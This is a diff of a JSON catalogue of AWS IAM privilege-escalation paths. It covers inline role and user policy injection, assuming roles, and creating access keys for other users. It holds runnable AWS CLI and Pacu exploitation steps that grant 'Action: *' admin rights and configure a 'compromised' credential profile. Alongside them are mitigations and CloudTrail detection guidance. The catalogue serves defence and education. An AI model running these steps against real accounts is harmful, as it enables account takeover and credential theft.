+          "from": "start",
+          "to": "target_role",
+          "label": "iam:PutRolePolicy",
+          "description": "The attacker uses `iam:PutRolePolicy` to add an inline policy with administrative permissions directly to the target role.\n\nCommand:\n```bash\naws iam put-role-policy \\\n  --role-name target-role-name \\\n  --policy-name AdminInlinePolicy \\\n  --policy-document file://admin_policy.json\n```\n\nWhere admin_policy.json contains a policy document granting full administrative access (e.g., `\"Action\": \"*\"`, `\"Resource\": \"*\"`). Unlike customer-managed policies, inline policies are embedded directly in the IAM entity (in this case, the role) and take effect immediately. The role instantly gains these elevated permissions.\n"
+        },
+        {
+          "from": "target_role",
+          "to": "admin",
+          "label": "sts:AssumeRole",
+          "description": "The attacker uses `sts:AssumeRole` to assume the target role, which now has administrative permissions via the newly added inline policy.\n\nCommand:\n```bash\naws sts assume-role \\\n  --role-arn \"arn:aws:iam::ACCOUNT_ID:role/target-role-name\" \\\n  --role-session-name \"privesc-session\"\n```\n\nThe API returns temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) that have full administrative access. Configure these credentials in the AWS CLI or SDK to perform administrative actions:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>\n\n# Verify administrative access\naws iam list-users\n```\n"
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": null,
+      "lastUpdated": null,
+      "contributors": []
+    },
+    "filePath": "data/paths/iam/iam-017.yaml"
+  },
+  {
+    "id": "iam-018",
+    "name": "iam:PutUserPolicy + iam:CreateAccessKey",
+    "category": "lateral-movement",
+    "services": [
+      "iam"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PutUserPolicy",
+          "resourceConstraints": "Must have access to add inline policies to the target user"
+        },
+        {
+          "permission": "iam:CreateAccessKey",
+          "resourceConstraints": "Must have permission to create access keys for the target user"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering available users to target"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for retrieving target user details and verifying existence"
+        },
+        {
+          "permission": "iam:ListUserPolicies",
+          "resourceConstraints": "Helpful for viewing current inline policies on the target user before and after modification"
+        },
+        {
+          "permission": "iam:GetUserPolicy",
+          "resourceConstraints": "Useful for retrieving and examining the content of existing inline policies"
+        },
+        {
+          "permission": "iam:ListAccessKeys",
+          "resourceConstraints": "Useful for checking the number of existing access keys (AWS limit is 2 per user)"
+        }
+      ]
+    },
+    "description": "A principal with `iam:PutUserPolicy` and `iam:CreateAccessKey` permissions on a target IAM user can achieve privilege escalation by adding an inline policy with administrative permissions to that user, creating new access keys for them, and then authenticating as that user with the newly created credentials. This is a lateral movement attack where the attacker embeds an administrative policy document directly into another user and then assumes their identity. Unlike managed policy attachment, inline policies are embedded directly in the user object, making them less visible in some security reviews and IAM policy management tools.",
+    "prerequisites": {
+      "admin": [
+        "A target IAM user must exist that the starting principal has permission to add inline policies to",
+        "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)",
+        "The starting principal must have iam:PutUserPolicy permission scoped to the target user",
+        "The starting principal must have iam:CreateAccessKey permission scoped to the target user"
+      ],
+      "lateral": [
+        "A target IAM user must exist that the starting principal has permission to add inline policies to",
+        "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)",
+        "The starting principal must have iam:PutUserPolicy permission scoped to the target user",
+        "The starting principal must have iam:CreateAccessKey permission scoped to the target user"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "# Set the target user name\nTARGET_USER=\"target-user-name\"\n",
+          "description": "Define the target user that will be modified and compromised"
+        },
+        {
+          "step": 2,
+          "command": "# List existing access keys for the target user\naws iam list-access-keys --user-name $TARGET_USER\n",
+          "description": "Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete one first using iam:DeleteAccessKey permission."
+        },
+        {
+          "step": 3,
+          "command": "# Create an admin policy document\ncat > admin-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n",
+          "description": "Create a policy document with administrative permissions (all actions on all resources)"
+        },
+        {
+          "step": 4,
+          "command": "# Add the admin inline policy to the target user\naws iam put-user-policy \\\n  --user-name $TARGET_USER \\\n  --policy-name AdminEscalation \\\n  --policy-document file://admin-policy.json\n",
+          "description": "Add the administrative inline policy to the target user using iam:PutUserPolicy"
+        },
+        {
+          "step": 5,
+          "command": "# Wait for IAM policy changes to propagate (15 seconds)\nsleep 15\n",
+          "description": "Wait for the inline policy to propagate across AWS infrastructure"
+        },
+        {
+          "step": 6,
+          "command": "# Verify the inline policy was added\naws iam list-user-policies --user-name $TARGET_USER\n",
+          "description": "Verify that the AdminEscalation inline policy is now attached to the target user"
+        },
+        {
+          "step": 7,
+          "command": "# Create new access keys for the target user\nCREDENTIALS=$(aws iam create-access-key \\\n  --user-name $TARGET_USER \\\n  --output json)\n\n# Extract the credentials\nNEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')\nNEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')\n\necho \"New Access Key ID: $NEW_ACCESS_KEY_ID\"\necho \"New Secret Access Key: $NEW_SECRET_ACCESS_KEY\"\n",
+          "description": "Create new access keys for the target user and extract the credentials"
+        },
+        {
+          "step": 8,
+          "command": "# Configure a new AWS CLI profile with the stolen credentials\naws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised-user\naws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised-user\naws configure set region us-east-1 --profile compromised-user\n",
+          "description": "Configure a new AWS CLI profile using the newly created access keys"
+        },
+        {
+          "step": 9,
+          "command": "# Verify administrative access using the new credentials\naws iam list-users --max-items 5 --profile compromised-user\n",
+          "description": "Verify that you now have administrative access by listing IAM users with the compromised credentials"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "# Use Pacu to add an admin inline policy to the target user\nrun iam__put_user_policy --user-name target-user-name --policy-name AdminEscalation --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'\n",
+          "description": "Use Pacu to add an administrative inline policy to the target user"
+        },
+        {
+          "step": 2,
+          "command": "# Use Pacu to create access keys for the target user\nrun iam__create_access_key --user-name target-user-name\n",
+          "description": "Use Pacu to create new access keys for the target user and save them for authentication"
+        },
+        {
+          "step": 3,
+          "command": "# Switch to the newly created credentials\nswap_keys\n",
+          "description": "Configure Pacu to use the newly created access keys for the target user"
+        }
+      ]
+    },
+    "limitations": "This attack requires that the starting principal has both permissions (iam:PutUserPolicy AND iam:CreateAccessKey) scoped to the same target user. If these permissions are scoped to different users, the attack path is not viable.\n\nAdditionally, the target user must have fewer than 2 access keys due to AWS's hard limit. If the user already has 2 keys, the attacker would need an additional permission (iam:DeleteAccessKey) to remove an existing key before creating a new one.\n\nThe attack provides administrative access because the attacker controls the inline policy document content. Unlike iam:AttachUserPolicy (which requires choosing from existing managed policies), iam:PutUserPolicy allows the attacker to embed any policy document directly into the user, guaranteeing administrative permissions regardless of what policies exist in the environment.\n\nInline policies can be harder to detect in security reviews because they are embedded in the user object rather than referenced as separate policy entities. Some IAM policy management tools may not highlight inline policies as prominently as managed policy attachments.\n",
+    "recommendation": "Restrict `iam:PutUserPolicy` and `iam:CreateAccessKey` using the principle of least privilege. These permissions should rarely be granted together on the same target user, as this combination creates a direct privilege escalation path.\n\n**Prevention strategies:**\n\n1. Restrict `iam:PutUserPolicy` to prevent cross-user inline policy modification:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PutUserPolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:user/${aws:username}\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:UserName\": \"${aws:username}\"\n    }\n  }\n}\n```\n\n2. Restrict `iam:CreateAccessKey` to prevent cross-user access key creation:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:CreateAccessKey\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:user/${aws:username}\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:UserName\": \"${aws:username}\"\n    }\n  }\n}\n```\n\n3. Use IAM permissions boundaries to limit the maximum permissions a user can have, even if administrative inline policies are added\n\n4. Separate the permissions - avoid granting both `iam:PutUserPolicy` and `iam:CreateAccessKey` to the same principal for other users\n\n5. Require MFA for sensitive inline policy operations and access key creation\n\n6. Implement regular audits of inline policies, as they can be less visible than managed policies in standard IAM reviews\n\n7. Use Service Control Policies (SCPs) to prevent the addition of overly permissive inline policies\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `PutUserPolicy` API calls where the calling principal differs from the target user\n- `CreateAccessKey` API calls where the calling principal differs from the target user\n- Sequential occurrences of `PutUserPolicy` followed by `CreateAccessKey` on the same user within a short time window\n- `PutUserPolicy` events with policy documents containing broad permissions (e.g., `\"Action\": \"*\"` or `\"Action\": \"iam:*\"`)\n- Access key creation events that follow inline policy modification events\n\nSet up CloudWatch alarms for unexpected changes to inline user policies and creation of access keys by non-self principals. Investigate any modifications to user inline policies combined with access key creation. Consider implementing automated responses to roll back suspicious inline policy changes.\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2018"
+    },
+    "references": [
+      {
+        "title": "AWS IAM Privilege Escalation \u2013 Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "AWS IAM Privilege Escalation Methods (GitHub Repository)",
+        "url": "https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation"
+      },
+      {
+        "title": "AWS IAM Privilege Escalation Techniques - Hacking The Cloud",
+        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+      },
+      {
+        "title": "Investigating Privilege Escalation Methods in AWS (Bishop Fox)",
+        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
+      },
+      {
+        "title": "IAM Vulnerable - AWS IAM Privilege Escalation Playground",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "iam-001",
+      "iam-002",
+      "iam-003",
+      "iam-014",
+      "iam-015"
+    ],
+    "detectionRules": [
+      {
+        "platform": "CloudSIEM",
+        "ruleId": "TBD",
+        "url": "https://docs.datadoghq.com/security/default_rules/"
+      }
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true,
+      "pacu": true,
+      "prowler": true
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "starting-principal",
+          "type": "principal",
+          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:PutUserPolicy` and `iam:CreateAccessKey` permissions on the target user. This principal may have minimal or no administrative permissions initially, but the combination of these two permissions creates a complete privilege escalation path.\n"
+        },
+        {
+          "id": "target_user",
+          "label": "target-user",
+          "type": "resource",
+          "description": "The IAM user being modified and compromised. Must be a valid IAM user with fewer than 2 existing access keys. Initially, this user may have minimal or no privileges. The attacker will create an inline policy granting administrative permissions and then create new access keys for authentication.\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "Full administrative access to the AWS account. The attacker achieves this by first using `iam:PutUserPolicy` to create an inline policy on the target user with administrative permissions, then using `iam:CreateAccessKey` to create new access keys for authentication. This is a deterministic outcome since the attacker controls the policy document content and can grant themselves any permissions they choose.\n"
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "target_user",
+          "label": "iam:PutUserPolicy",
+          "description": "The attacker uses `iam:PutUserPolicy` to create or update an inline policy on the target user, granting administrative permissions.\n\nCommand:\n```bash\naws iam put-user-policy \\\n  --user-name target-user-name \\\n  --policy-name AdminPolicy \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'\n```\n\nAfter this action, the target user has administrative permissions via an inline policy. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.\n"
+        },
+        {
+          "from": "target_user",
+          "to": "admin",
+          "label": "iam:CreateAccessKey + Authenticate",
+          "description": "The attacker uses `iam:CreateAccessKey` to create new access keys for the now-privileged target user, then authenticates using those credentials.\n\nCommands:\n```bash\n# Create access keys\nCREDENTIALS=$(aws iam create-access-key \\\n  --user-name target-user-name \\\n  --output json)\n\nNEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')\nNEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')\n\n# Configure profile with new credentials\naws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised\naws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised\n\n# Use the compromised credentials\naws iam list-users --profile compromised\n```\n\nThese new access keys have full administrative permissions and can be used to perform any action in the AWS account. Unlike temporary credentials from AssumeRole, these access keys do not expire and remain valid until explicitly deactivated or deleted.\n"
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": null,
+      "lastUpdated": null,
+      "contributors": []
+    },
+    "filePath": "data/paths/iam/iam-018.yaml"
   },
   {
     "id": "lambda-001",
